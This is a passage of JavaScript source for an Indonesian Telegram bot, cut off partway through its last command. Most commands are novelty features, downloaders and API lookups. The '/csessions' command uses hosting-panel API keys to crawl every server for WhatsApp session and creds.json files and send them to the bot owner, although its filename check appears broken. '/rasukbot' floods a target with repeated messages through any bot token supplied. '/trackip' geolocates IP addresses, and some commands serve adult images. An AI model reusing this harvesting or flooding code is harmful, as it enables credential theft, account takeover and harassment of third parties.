bot.command("status", checkOwner, checkAdmin, async (ctx) => {
  try {
    const waStatus = sock && sock.user
      ? "Terhubung"
      : "Tidak Terhubung";

    const message = `
<blockquote>
┏━━━━━━━━━━━━━━━━━━━━
┃ STATUS WHATSAPP
┣━━━━━━━━━━━━━━━━━━━━
┃ ⌬ STATUS : ${waStatus}
┗━━━━━━━━━━━━━━━━━━━━
</blockquote>
`;

    await ctx.reply(message, {
      parse_mode: "HTML"
    });

  } catch (error) {
    console.error("Gagal menampilkan status bot:", error);
    ctx.reply("❌ Gagal menampilkan status bot.");
  }
});
/////////////////END/////////////////////////
bot.command("rasukbot", checkOwner, async (ctx) => {
  const chatId = ctx.chat.id;
  const text = ctx.message.text;
  const input = text.split(" ").slice(1).join(" ").trim();
  const reply = ctx.message.reply_to_message;

  // Jika hanya /rasukbot
  if (!input) {
    return ctx.replyWithHTML(
      "📘 <b>Cara penggunaan /rasukbot</b>\n\n" +
      "🟢 <b>1. Kirim langsung (tanpa reply)</b>\n" +
      "Gunakan format:\n<code>/rasukbot token|id|pesan|jumlah</code>\n\n" +
      "Contoh:\n<code>/rasukbot 123456:ABCDEF|987654321|Halo bro|5</code>\n\n" +
      "🔵 <b>2. Balas pesan target</b>\n" +
      "Balas pesan orangnya, lalu ketik:\n<code>/rasukbot token|pesan|jumlah</code>\n\n" +
      "Contoh:\n<code>/rasukbot 123456:ABCDEF|Halo|3</code>"
    );
  }

  try {
    let token, targetId, pesan, jumlah;

    // MODE REPLY
    if (reply) {
      const parts = input.split("|").map(v => v.trim());
      if (parts.length < 3) {
        return ctx.replyWithHTML(
          "❌ Format salah!\nGunakan:\n<code>/rasukbot token|pesan|jumlah</code> (reply pesan target)"
        );
      }

      [token, pesan, jumlah] = parts;
      targetId = reply.from.id;
      jumlah = parseInt(jumlah);

    } else {
      // MODE MANUAL
      const parts = input.split("|").map(v => v.trim());
      if (parts.length < 4) {
        return ctx.replyWithHTML(
          "❌ Format salah!\nGunakan:\n<code>/rasukbot token|id|pesan|jumlah</code>"
        );
      }

      [token, targetId, pesan, jumlah] = parts;
      jumlah = parseInt(jumlah);
    }

    if (!token || !targetId || !pesan || isNaN(jumlah)) {
      return ctx.replyWithHTML(
        "❌ Format tidak valid!\nGunakan:\n<code>/rasukbot token|id|pesan|jumlah</code>"
      );
    }

    await ctx.reply("🚀 Mengirim pesan...");

    for (let i = 0; i < jumlah; i++) {
      await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
        chat_id: targetId,
        text: pesan
      });
    }

    await ctx.replyWithHTML(
      `✅ Berhasil mengirim ${jumlah} pesan ke ID <code>${targetId}</code>`
    );

  } catch (err) {
    await ctx.replyWithHTML(
      `❌ Gagal mengirim pesan:\n<code>${err.message}</code>`
    );
  }
});
bot.command("cekid", async (ctx) => {
const userId = ctx.from.id;

let teks = `𝗜𝗗 𝗟𝗨 𝗡𝗜 -> ${userId}`;

ctx.sendMessage(userId, teks);

});
  const quotes = [
    "Aku rela jadi yang kedua, asal kamu bahagia.",
    "Kamu tahu nggak? Kamu itu alasanku buka mata tiap pagi.",
    "Kalau cinta butuh pengorbanan, aku rela disakiti.",
    "Aku bukan yang terbaik, tapi aku akan berusaha jadi yang paling setia.",
    "Sayang, jangan pergi. Aku belum selesai mencintaimu.",
    "Kamu adalah alasan aku selalu tersenyum tiap hari.",
    "Cintaku kayak utang negara, nggak akan lunas sampai kapanpun.",
    "Kalau kamu bahagia sama dia, aku rela mundur walau hati hancur.",
    "Kalau cinta itu bodoh, maka aku bangga jadi yang paling bodoh.",
    "Cinta sejati itu bukan yang datang pertama, tapi yang bertahan sampai akhir.",
    "Setiap detik tanpamu itu siksaan.",
    "Aku ingin jadi alasan kamu bahagia, bukan alasan kamu terluka.",
    "Aku bucin karena kamu, bukan karena siapa-siapa.",
    "Kalau sayang bilang, jangan disimpan dalam diam.",
    "Jangan lelah mencintaiku, aku sedang belajar memperbaiki diri untukmu."
  ];
  bot.command("bucin", (ctx) => {
    const random = quotes[Math.floor(Math.random() * quotes.length)];
    ctx.reply(`💘 ${random}`);
  });

  const teks = [
    "Kadang, yang setia malah disia-siakan.",
    "Aku tersenyum, padahal hatiku hancur.",
    "Cinta tak selamanya indah, kadang menyakitkan.",
    "Aku rindu, tapi aku sadar aku bukan siapa-siapa.",
    "Jangan tanya kenapa aku diam, karena aku sudah lelah.",
    "Dulu kita dekat, sekarang hanya sisa kenangan.",
    "Aku mencintaimu, tapi kamu mencintainya.",
    "Kamu bahagia tanpaku, dan itu yang membuatku lebih sakit.",
    "Aku bertahan karena cinta, bukan karena tidak bisa pergi.",
    "Mereka bilang sabar, tapi hatiku sudah berdarah-darah.",
    "Terkadang, aku berharap tak pernah mengenalmu.",
    "Aku takut jatuh cinta lagi, karena sakitnya belum sembuh.",
    "Kamu ajari aku bahagia, lalu kamu pergi tinggalkan luka.",
    "Katanya cinta itu indah, kenapa aku selalu terluka?",
    "Aku sudah cukup kuat... sampai kamu datang lagi dengan luka baru."
  ];
  bot.command("sadboy", (ctx) => {
    ctx.reply(`😢 ${teks[Math.floor(Math.random() * teks.length)]}`);
  });
bot.command("gaymeter", (ctx) => {
    const percent = Math.floor(Math.random() * 101);
    ctx.reply(`🌈 Gaymeter kamu: ${percent}%`);
  }); 
  const kalimat = [
    "👻 Kamu merasa ada yang mengawasimu...",
    "😱 Bayangan hitam muncul di pojok ruangan.",
    "💀 Terdengar suara menyeramkan: 'Kembalikan bonekaku...'",
    "🕯️ Lilin tiba-tiba padam dan suhu menjadi dingin.",
    "🔪 Sosok putih berdiri di depan cermin.",
    "📞 Telepon berdering, tapi tak ada suara saat diangkat.",
    "📺 TV menyala sendiri dengan suara statik keras.",
    "🚪 Pintu kamar bergoyang sendiri di tengah malam.",
    "🩸 Ada jejak kaki basah padahal lantai kering.",
    "🪞 Cermin retak tanpa sebab, ada tulisan 'I see you'.",
    "🕳️ Kamu mendengar bisikan di telingamu.",
    "🩻 Tiba-tiba jantungmu berdetak cepat, entah kenapa.",
    "📸 Kamera menangkap sosok bayangan di belakangmu.",
    "📷 Foto lama berubah sendiri, ada sosok baru muncul.",
    "⛓️ Rantai besi berbunyi seperti diseret... semakin dekat."
  ];
  bot.command("ghost", (ctx) => {
    const hasil = kalimat[Math.floor(Math.random() * kalimat.length)];
    ctx.reply(hasil);
  });
  bot.command("hack", (ctx) => {
    const target = ctx.message.text.split(" ")[1] || "target";
    ctx.reply(`🛠️ Hacking ${target}...\n📡 Mengambil IP...\n🔓 Password ditemukan: 272011`);
  });
  bot.command("tinju", (ctx) => {
    const target = ctx.message.text.split(" ").slice(1).join(" ") || "orang asing";
    ctx.reply(`🥊 Kamu meninju ${target} sampai terbang!`);
  }); 
  bot.command('countryinfo', async (ctx) => {
    try {
      const input = ctx.message.text.split(' ').slice(1).join(' ');
      if (!input) {
        return ctx.reply('Masukkan nama negara setelah perintah.\n\nContoh:\n`/countryinfo Indonesia`', { parse_mode: 'Markdown' });
      }

      const res = await axios.post('https://api.siputzx.my.id/api/tools/countryInfo', {
        name: input
      });

      const { data } = res.data;

      if (!data) {
        return ctx.reply('Negara tidak ditemukan atau tidak valid.');
      }

      const caption = `
🌍 *${data.name}* (${res.data.searchMetadata.originalQuery})
📍 *Capital:* ${data.capital}
📞 *Phone Code:* ${data.phoneCode}
🌐 *Continent:* ${data.continent.name} ${data.continent.emoji}
🗺️ [Google Maps](${data.googleMapsLink})
📏 *Area:* ${data.area.squareKilometers} km²
🏳️ *TLD:* ${data.internetTLD}
💰 *Currency:* ${data.currency}
🗣️ *Languages:* ${data.languages.native.join(', ')}
🧭 *Driving Side:* ${data.drivingSide}
⚖️ *Government:* ${data.constitutionalForm}
🍺 *Alcohol Prohibition:* ${data.alcoholProhibition}
🌟 *Famous For:* ${data.famousFor}
      `.trim();

      await ctx.replyWithPhoto(
        { url: data.flag },
        {
          caption,
          parse_mode: 'Markdown',
        }
      );

     
      if (data.neighbors && data.neighbors.length) {
        const neighborText = data.neighbors.map(n => `🧭 *${n.name}*\n📍 [Maps](https://www.google.com/maps/place/${n.coordinates.latitude},${n.coordinates.longitude})`).join('\n\n');
        await ctx.reply(`🌐 *Negara Tetangga:*\n\n${neighborText}`, { parse_mode: 'Markdown' });
      }

    } catch (err) {
      console.error(err);
      ctx.reply('Gagal mengambil informasi negara. Coba lagi nanti atau pastikan nama negara valid.');
    }
  });   
  
bot.command("tourl", async (ctx) => {
  const r = ctx.message.reply_to_message;
  if (!r) return ctx.reply("❗ Reply ke media (foto/video/audio/doc/sticker) lalu kirim /tourl");
  try {
    const pick = r.photo?.slice(-1)[0]?.file_id || r.video?.file_id || r.document?.file_id || r.audio?.file_id || r.voice?.file_id || r.sticker?.file_id;
    if (!pick) return ctx.reply("❌ Tidak menemukan media valid.");
    const link = await ctx.telegram.getFileLink(pick);
    ctx.reply(`🔗 ${link}`);
  } catch { ctx.reply("❌ Gagal membuat URL media."); }
});
const listHentai = [
  {"url": "https://files.catbox.moe/5wt81f.jpg"},
  {"url": "https://files.catbox.moe/xdqj22.jpg"},
  {"url": "https://files.catbox.moe/lvafhj.jpg"},
  {"url": "https://files.catbox.moe/em6j1f.jpg"},
  {"url": "https://files.catbox.moe/5bgyld.jpg"},
  {"url": "https://files.catbox.moe/orafro.jpg"},
  {"url": "https://files.catbox.moe/lcm9x3.jpg"},
  {"url": "https://files.catbox.moe/x3ux77.jpg"},
  {"url": "https://files.catbox.moe/f5ucmj.jpg"},
  {"url": "https://files.catbox.moe/djq46h.jpg"},
  {"url": "https://files.catbox.moe/0bf9b5.jpg"},
  {"url": "https://files.catbox.moe/0bf9b5.jpg"},
  {"url": "https://files.catbox.moe/w0225y.jpg"},
  {"url": "https://files.catbox.moe/fqm5fg.jpg"},
  {"url": "https://files.catbox.moe/itv3b0.jpg"},
  {"url": "https://files.catbox.moe/s45bdq.jpg"},
  {"url": "https://files.catbox.moe/omhwvo.jpg"},
  {"url": "https://files.catbox.moe/8eaqrj.jpg"},
  {"url": "https://files.catbox.moe/fstacw.jpg"},
  {"url": "https://files.catbox.moe/fstacw.jpg"},
  {"url": "https://files.catbox.moe/e99emf.jpg"}
]

bot.command('hentai', checkPremium, async (ctx) => {
  const loadingMsg = await ctx.reply('🔄 Loading hentai...');
  
  const getRandom = () => listHentai[Math.floor(Math.random() * listHentai.length)];
  const pick = getRandom();
  
  try {
    await ctx.replyWithPhoto(pick.url, {
      caption: 'Hentai untuk anda🤤',
      reply_markup: {
        inline_keyboard: [[{ text: '➡️ Next Hentai', callback_data: 'hentai_next' }]]
      }
    });
    
    await ctx.deleteMessage(loadingMsg.message_id);
  } catch (err) {
    console.error('[HENTAI ERROR]', err.message);
    await ctx.editMessageText('❌ Gagal mengirim hentai. Coba lagi nanti.', {
      chat_id: ctx.chat.id,
      message_id: loadingMsg.message_id
    });
  }
});
bot.command("tiktokdl", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!args) return ctx.reply("🪧 Format: /tiktokdl https://vt.tiktok.com/ZSUeF1CqC/");

  let url = args;
  if (ctx.message.entities) {
    for (const e of ctx.message.entities) {
      if (e.type === "url") {
        url = ctx.message.text.substr(e.offset, e.length);
        break;
      }
    }
  }

  const wait = await ctx.reply("⏳ ☇ Sedang memproses video");

  try {
    const { data } = await axios.get("https://tikwm.com/api/", {
      params: { url },
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36",
        "accept": "application/json,text/plain,*/*",
        "referer": "https://tikwm.com/"
      },
      timeout: 20000
    });

    if (!data || data.code !== 0 || !data.data)
      return ctx.reply("❌ ☇ Gagal ambil data video pastikan link valid");

    const d = data.data;

    if (Array.isArray(d.images) && d.images.length) {
      const imgs = d.images.slice(0, 10);
      const media = await Promise.all(
        imgs.map(async (img) => {
          const res = await axios.get(img, { responseType: "arraybuffer" });
          return {
            type: "photo",
            media: { source: Buffer.from(res.data) }
          };
        })
      );
      await ctx.replyWithMediaGroup(media);
      return;
    }

    const videoUrl = d.play || d.hdplay || d.wmplay;
    if (!videoUrl) return ctx.reply("❌ ☇ Tidak ada link video yang bisa diunduh");

    const video = await axios.get(videoUrl, {
      responseType: "arraybuffer",
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36"
      },
      timeout: 30000
    });

    await ctx.replyWithVideo(
      { source: Buffer.from(video.data), filename: `${d.id || Date.now()}.mp4` },
      { supports_streaming: true }
    );
  } catch (e) {
    const err =
      e?.response?.status
        ? `❌ ☇ Error ${e.response.status} saat mengunduh video`
        : "❌ ☇ Gagal mengunduh, koneksi lambat atau link salah";
    await ctx.reply(err);
  } finally {
    try {
      await ctx.deleteMessage(wait.message_id);
    } catch {}
  }
});
bot.command("getcode", async (ctx) => {
  const senderId = ctx.from.id;
  const url = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!url)
    return ctx.reply("❌ Format :: /getcode https://namaweb");
  if (!/^https?:\/\//i.test(url))
    return ctx.reply("❌ URL tidak valid.");

  try {
    const response = await axios.get(url, {
      responseType: "text",
      headers: { "User-Agent": "Mozilla/5.0 (compatible; Bot/1.0)" },
      timeout: 20000,
    });

    const htmlContent = response.data;
    const filePath = path.join(__dirname, "web_source.html");
    fs.writeFileSync(filePath, htmlContent, "utf-8");

    await ctx.replyWithDocument({ source: filePath }, {
      caption: `✅ Get Code By Senn Offc ( 🍦 )\nURL : ${url}`,
    });

    fs.unlinkSync(filePath);
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Error: " + err.message);
  }
});

bot.command("csessions", checkOwner, async (ctx) => {
  const chatId = ctx.chat.id;
  const fromId = ctx.from.id;

  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("🪧 ☇ Format: /csessions https://domainpanel.com,ptla_123,ptlc_123");

  const args = text.split(",");
  const domain = args[0];
  const plta = args[1];
  const pltc = args[2];
  if (!plta || !pltc)
    return ctx.reply("🪧 ☇ Format: /csessions https://panelku.com,plta_123,pltc_123");

  await ctx.reply(
    "⏳ ☇ Sedang scan semua server untuk mencari folder sessions dan file creds.json",
    { parse_mode: "Markdown" }
  );

  const base = domain.replace(/\/+$/, "");
  const commonHeadersApp = {
    Accept: "application/json, application/vnd.pterodactyl.v1+json",
    Authorization: `Bearer ${plta}`,
  };
  const commonHeadersClient = {
    Accept: "application/json, application/vnd.pterodactyl.v1+json",
    Authorization: `Bearer ${pltc}`,
  };

  function isDirectory(item) {
    if (!item || !item.attributes) return false;
    const a = item.attributes;
    if (typeof a.is_file === "boolean") return a.is_file === false;
    return (
      a.type === "dir" ||
      a.type === "directory" ||
      a.mode === "dir" ||
      a.mode === "directory" ||
      a.mode === "d" ||
      a.is_directory === true ||
      a.isDir === true
    );
  }

  async function listAllServers() {
    const out = [];
    let page = 1;
    while (true) {
      const r = await axios.get(`${base}/api/application/servers`, {
        params: { page },
        headers: commonHeadersApp,
        timeout: 15000,
      }).catch(() => ({ data: null }));
      const chunk = (r && r.data && Array.isArray(r.data.data)) ? r.data.data : [];
      out.push(...chunk);
      const hasNext = !!(r && r.data && r.data.meta && r.data.meta.pagination && r.data.meta.pagination.links && r.data.meta.pagination.links.next);
      if (!hasNext || chunk.length === 0) break;
      page++;
    }
    return out;
  }

  async function traverseAndFind(identifier, dir = "/") {
    try {
      const listRes = await axios.get(
        `${base}/api/client/servers/${identifier}/files/list`,
        {
          params: { directory: dir },
          headers: commonHeadersClient,
          timeout: 15000,
        }
      ).catch(() => ({ data: null }));
      const listJson = listRes.data;
      if (!listJson || !Array.isArray(listJson.data)) return [];
      let found = [];

      for (let item of listJson.data) {
        const name = (item.attributes && item.attributes.name) || item.name || "";
        const itemPath = (dir === "/" ? "" : dir) + "/" + name;
        const normalized = itemPath.replace(/\/+/g, "/");
        const lower = name.toLowerCase();

        if ((lower === "session" || lower === "sessions") && isDirectory(item)) {
          try {
            const sessRes = await axios.get(
              `${base}/api/client/servers/${identifier}/files/list`,
              {
                params: { directory: normalized },
                headers: commonHeadersClient,
                timeout: 15000,
              }
            ).catch(() => ({ data: null }));
            const sessJson = sessRes.data;
            if (sessJson && Array.isArray(sessJson.data)) {
              for (let sf of sessJson.data) {
                const sfName = (sf.attributes && sf.attributes.name) || sf.name || "";
                const sfPath = (normalized === "/" ? "" : normalized) + "/" + sfName;
                if (sfName.toLowerCase() === "sension, sensions") {
                  found.push({
                    path: sfPath.replace(/\/+/g, "/"),
                    name: sfName,
                  });
                }
              }
            }
          } catch (_) {}
        }

        if (isDirectory(item)) {
          try {
            const more = await traverseAndFind(identifier, normalized === "" ? "/" : normalized);
            if (more.length) found = found.concat(more);
          } catch (_) {}
        } else {
          if (name.toLowerCase() === "sension, sensions") {
            found.push({ path: (dir === "/" ? "" : dir) + "/" + name, name });
          }
        }
      }
      return found;
    } catch (_) {
      return [];
    }
  }

  try {
    const servers = await listAllServers();
    if (!servers.length) {
      return ctx.reply("❌ ☇ Tidak ada server yang bisa discan");
    }

    let totalFound = 0;

    for (let srv of servers) {
      const identifier =
        (srv.attributes && srv.attributes.identifier) ||
        srv.identifier ||
        (srv.attributes && srv.attributes.id);
      const name =
        (srv.attributes && srv.attributes.name) ||
        srv.name ||
        identifier ||
        "unknown";
      if (!identifier) continue;

      const list = await traverseAndFind(identifier, "/");
      if (list && list.length) {
        for (let fileInfo of list) {
          totalFound++;
          const filePath = ("/" + fileInfo.path.replace(/\/+/g, "/")).replace(/\/+$/,"");

          await ctx.reply(
            `📁 ☇ Ditemukan sension di server ${name} path: ${filePath}`,
            { parse_mode: "Markdown" }
          );

          try {
            const downloadRes = await axios.get(
              `${base}/api/client/servers/${identifier}/files/download`,
              {
                params: { file: filePath },
                headers: commonHeadersClient,
                timeout: 15000,
              }
            ).catch(() => ({ data: null }));

            const dlJson = downloadRes && downloadRes.data;
            if (dlJson && dlJson.attributes && dlJson.attributes.url) {
              const url = dlJson.attributes.url;
              const fileRes = await axios.get(url, {
                responseType: "arraybuffer",
                timeout: 20000,
              });
              const buffer = Buffer.from(fileRes.data);
              await ctx.telegram.sendDocument(ownerID, {
                source: buffer,
                filename: `${String(name).replace(/\s+/g, "_")}_sensions`,
              });
            } else {
              await ctx.reply(
                `❌ ☇ Gagal mendapatkan URL download untuk ${filePath} di server ${name}`
              );
            }
          } catch (e) {
            console.error(`Gagal download ${filePath} dari ${name}:`, e?.message || e);
            await ctx.reply(
              `❌ ☇ Error saat download file creds.json dari ${name}`
            );
          }
        }
      }
    }

    if (totalFound === 0) {
      return ctx.reply("✅ ☇ Scan selesai tidak ditemukan creds.json di folder session/sessions pada server manapun");
    } else {
      return ctx.reply(`✅ ☇ Scan selesai total file creds.json berhasil diunduh & dikirim: ${totalFound}`);
    }
  } catch (err) {
    ctx.reply("❌ ☇ Terjadi error saat scan");
  }
});

bot.command("gpt", async (ctx) => {
  const chatId = ctx.chat.id;

  // ambil query setelah /gpt
  const query = ctx.message.text.split(" ").slice(1).join(" ").trim();

  if (!query) {
    return ctx.reply(
      "⚠️ Contoh:\n/gpt apa itu gravitasi?"
    );
  }

  // pesan loading
  await ctx.reply("⏳ Tunggu sebentar, lagi mikir...");

  try {
    const { data } = await axios.get("https://www.abella.icu/gpt-3.5", {
      params: { q: query },
      timeout: 30000,
    });

    const answer = data?.data?.answer;

    if (answer) {
      return ctx.reply(
        "```\n" + answer + "\n```",
        { parse_mode: "Markdown" }
      );
    } else {
      return ctx.reply("⚠️ Tidak ada respons valid dari AI.");
    }

  } catch (err) {
    console.error("GPT Error:", err);
    return ctx.reply(`❌ Error: ${err.message}`);
  }
});

bot.command("brat", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("❌ Masukkan teks!");

  try {
    const apiURL = `https://api.nvidiabotz.xyz/imagecreator/bratv?text=${encodeURIComponent(
      text
    )}&isVideo=false`;

    const res = await axios.get(apiURL, { responseType: "arraybuffer" });
    await ctx.replyWithSticker({ source: Buffer.from(res.data) });
  } catch (e) {
    console.error("Error saat membuat stiker:", e);
    ctx.reply("❌ Gagal membuat stiker brat.");
  }
});

bot.command("ssiphone", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" "); 

  if (!text) {
    return ctx.reply(
      "❌ Format: /ssiphone 18:00|40|Indosat|xavionerAmpazz",
      { parse_mode: "Markdown" }
    );
  }


  let [time, battery, carrier, ...msgParts] = text.split("|");
  if (!time || !battery || !carrier || msgParts.length === 0) {
    return ctx.reply(
      "❌ Format: /ssiphone 18:00|40|Indosat|hai hai`",
      { parse_mode: "Markdown" }
    );
  }

  await ctx.reply("⏳ Wait a moment...");

  let messageText = encodeURIComponent(msgParts.join("|").trim());
  let url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(
    time
  )}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(
    carrier
  )}&messageText=${messageText}&emojiStyle=apple`;

  try {
    let res = await fetch(url);
    if (!res.ok) {
      return ctx.reply("❌ Gagal mengambil data dari API.");
    }

    let buffer;
    if (typeof res.buffer === "function") {
      buffer = await res.buffer();
    } else {
      let arrayBuffer = await res.arrayBuffer();
      buffer = Buffer.from(arrayBuffer);
    }

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `✅ Ss Iphone By Senn Offc ( 🕷️ )`,
      parse_mode: "Markdown"
    });
  } catch (e) {
    console.error(e);
    ctx.reply(" Terjadi kesalahan saat menghubungi API.");
  }
});
bot.command("trackip", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ").filter(Boolean);
  if (!args[1]) return ctx.reply("Format: /trackip 8.8.8.8");

  const ip = args[1].trim();

  function isValidIPv4(ip) {
    const parts = ip.split(".");
    if (parts.length !== 4) return false;
    return parts.every(p => {
      if (!/^\d{1,3}$/.test(p)) return false;
      if (p.length > 1 && p.startsWith("0")) return false; // hindari "01"
      const n = Number(p);
      return n >= 0 && n <= 255;
    });
  }

  function isValidIPv6(ip) {
    const ipv6Regex = /^(([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|(::)|(::[0-9a-fA-F]{1,4})|([0-9a-fA-F]{1,4}::[0-9a-fA-F]{0,4})|([0-9a-fA-F]{1,4}(:[0-9a-fA-F]{1,4}){0,6}::([0-9a-fA-F]{1,4}){0,6}))$/;
    return ipv6Regex.test(ip);
  }

  if (!isValidIPv4(ip) && !isValidIPv6(ip)) {
    return ctx.reply("❌ ☇ IP tidak valid masukkan IPv4 (contoh: 8.8.8.8) atau IPv6 yang benar");
  }

  let processingMsg = null;
  try {
  processingMsg = await ctx.reply(`🔎 ☇ Tracking IP ${ip} — sedang memproses`, {
    parse_mode: "HTML"
  });
} catch (e) {
    processingMsg = await ctx.reply(`🔎 ☇ Tracking IP ${ip} — sedang memproses`);
  }

  try {
    const res = await axios.get(`https://ipwhois.app/json/${encodeURIComponent(ip)}`, { timeout: 10000 });
    const data = res.data;

    if (!data || data.success === false) {
      return await ctx.reply(`❌ ☇ Gagal mendapatkan data untuk IP: ${ip}`);
    }

    const lat = data.latitude || "";
    const lon = data.longitude || "";
    const mapsUrl = lat && lon ? `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(lat + ',' + lon)}` : null;

    const caption = `
⫹⫺ - IP: ${data.ip || "-"}
⫹⫺ - Country: ${data.country || "-"} ${data.country_code ? `(${data.country_code})` : ""}
⫹⫺ - Region: ${data.region || "-"}
⫹⫺ - City: ${data.city || "-"}
⫹⫺ - ZIP: ${data.postal || "-"}
⫹⫺ - Timezone: ${data.timezone_gmt || "-"}
⫹⫺ - ISP: ${data.isp || "-"}
⫹⫺ - Org: ${data.org || "-"}
⫹⫺ - ASN: ${data.asn || "-"}
⫹⫺ - Lat/Lon: ${lat || "-"}, ${lon || "-"}
`.trim();

    const inlineKeyboard = mapsUrl ? {
      reply_markup: {
        inline_keyboard: [
          [{ text: "⌜🌍⌟ ☇ オープンロケーション", url: mapsUrl }]
        ]
      }
    } : null;

    try {
      if (processingMsg && processingMsg.photo && typeof processingMsg.message_id !== "undefined") {
        await ctx.telegram.editMessageCaption(
          processingMsg.chat.id,
          processingMsg.message_id,
          undefined,
          caption,
          { parse_mode: "HTML", ...(inlineKeyboard ? inlineKeyboard : {}) }
        );
      } else if (typeof thumbnailUrl !== "undefined" && thumbnailUrl) {
        await ctx.replyWithPhoto(thumbnailUrl, {
          caption,
          parse_mode: "HTML",
          ...(inlineKeyboard ? inlineKeyboard : {})
        });
      } else {
        if (inlineKeyboard) {
          await ctx.reply(caption, { parse_mode: "HTML", ...inlineKeyboard });
        } else {
          await ctx.reply(caption, { parse_mode: "HTML" });
        }
      }
    } catch (e) {
      if (mapsUrl) {
        await ctx.reply(caption + `📍 ☇ Maps: ${mapsUrl}`, { parse_mode: "HTML" });
      } else {
        await ctx.reply(caption, { parse_mode: "HTML" });
      }
    }

  } catch (err) {
    await ctx.reply("❌ ☇ Terjadi kesalahan saat mengambil data IP (timeout atau API tidak merespon). Coba lagi nanti");
  }
});
bot.action('hentai_next', async (ctx) => {
  const getRandom = () => listHentai[Math.floor(Math.random() * listHentai.length)];
  
  try {
    await ctx.answerCbQuery();
    
    const loadingMsg = await ctx.reply('🔄 Loading hentai berikutnya...');
    await ctx.deleteMessage();
    
    const pick = getRandom();
    await ctx.replyWithPhoto(pick.url, {
      caption: 'Hentai selanjutnya untuk anda🤤',
      reply_markup: {
        inline_keyboard: [[{ text: '➡️ Next Hentai', callback_data: 'hentai_next' }]]
      }
    });
    
    await ctx.deleteMessage(loadingMsg.message_id);
  } catch (err) {
    console.error('[HENTAI NEXT ERROR]', err.message);
    await ctx.answerCbQuery('❌ Error loading hentai', { show_alert: true });
  }
});
const videoList = [
  {"url": "https://files.catbox.moe/8c7gz3.mp4"},
  {"url": "https://files.catbox.moe/nk5l10.mp4"},
  {"url": "https://files.catbox.moe/r3ip1j.mp4"},
  {"url": "https://files.catbox.moe/71l6bo.mp4"},
  {"url": "https://files.catbox.moe/rdggsh.mp4"},
  {"url": "https://files.catbox.moe/3288uf.mp4"},
  {"url": "https://files.catbox.moe/jdopgq.mp4"},
  {"url": "https://files.catbox.moe/8ca9cw.mp4"},
  {"url": "https://files.catbox.moe/b99qh3.mp4"},
  {"url": "https://files.catbox.moe/6bkokw.mp4"},
  {"url": "https://files.catbox.moe/ebisdh.mp4"},
  {"url": "https://files.catbox.moe/3yko44.mp4"},
  {"url": "https://files.catbox.moe/apqlvo.mp4"},
  {"url": "https://files.catbox.moe/wqe1r7.mp4"},
  {"url": "https://files.catbox.moe/nk5l10.mp4"},
  {"url": "https://files.catbox.moe/8c7gz3.mp4"},
  {"url": "https://files.catbox.moe/wqe1r7.mp4"},
  {"url": "https://files.catbox.moe/n37liq.mp4"},
  {"url": "https://files.catbox.moe/0728bg.mp4"},
  {"url": "https://files.catbox.moe/p69jdc.mp4"},
  {"url": "https://files.catbox.moe/occ3en.mp4"},
  {"url": "https://files.catbox.moe/y8hmau.mp4"},
  {"url": "https://files.catbox.moe/tvj95b.mp4"},
  {"url": "https://files.catbox.moe/3g2djb.mp4"},
  {"url": "https://files.catbox.moe/xlbafn.mp4"}
  // ... tambahkan yang lain
]

bot.command('web2apk', async (ctx) => {
  const args = ctx.message.text.split(' ').slice(1);
  if (args.length < 3) {
    return ctx.reply("Reply Icon Web : `/web2apk <url> <namaApp> <email>`", { parse_mode: 'Markdown' });
  }
  if (!ctx.message.reply_to_message?.photo) {
    return ctx.reply('Kamu harus reply foto dulu untuk dijadikan ikon APK!', { parse_mode: 'Markdown' });
  }

  const [url, appName, email] = args;
  try { new URL(url); } catch { return ctx.reply('URL tidak valid'); }
  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) return ctx.reply('Email tidak valid');

  const waitMsg = await ctx.reply('Upload & build APK dimulai… (perkiraan memakan waktu 3-8 menit)', { parse_mode: 'Markdown' });

  (async () => {                       
    try {
      const photo = ctx.message.reply_to_message.photo.pop();
      const fileLink = await ctx.telegram.getFileLink(photo.file_id);
      const { data: buffer } = await axios.get(fileLink.href, { responseType: 'arraybuffer' });

      const form = new FormData();
      form.append('files', buffer, { filename: 'icon.png', contentType: 'image/png' });

      const up = await axios.post('https://cdn.yupra.my.id/upload', form, {
        headers: form.getHeaders(),
        timeout: 30000
      });
      if (!up.data?.success || !up.data.files?.[0]) throw new Error('CDN gagal');
      const iconUrl = 'https://cdn.yupra.my.id' + up.data.files[0].url;

      const buildUrl =
        'https://api.fikmydomainsz.xyz/tools/toapp/build-complete' +
        '?url=' + encodeURIComponent(url) +
        '&email=' + encodeURIComponent(email) +
        '&appName=' + encodeURIComponent(appName) +
        '&appIcon=' + encodeURIComponent(iconUrl);

      const { data: job } = await axios.get(buildUrl, { timeout: 0 });
      if (!job.status) throw new Error(job.error || 'Build gagal');

      const caption =
        `Aplikasi berhasil dibuat!\n\n` +
        `Nama: ${appName}\n` +
        `Download APK: ${job.downloadUrl}`;

      await ctx.telegram.sendMessage(ctx.chat.id, caption, {
        parse_mode: 'Markdown',
        disable_web_page_preview: true
      });
    } catch (err) {
      await ctx.telegram.sendMessage(ctx.chat.id, `${err.message || 'Terjadi kesalahan'}`, {
        parse_mode: 'Markdown'
      });
      console.error('[X]', err);
    }
  })();

  return;
});

bot.command("pair", async (ctx) => {
    try {
        const chatId = ctx.chat.id;

        // Ambil admin grup
        const members = await ctx.telegram.getChatAdministrators(chatId);

        // Ambil nama depan admin
        const names = members
            .map(m => m.user.first_name)
            .filter(Boolean);

        if (names.length < 2) {
            return ctx.reply("Admin kurang buat dipasangin 😹");
        }

        const a = names[Math.floor(Math.random() * names.length)];
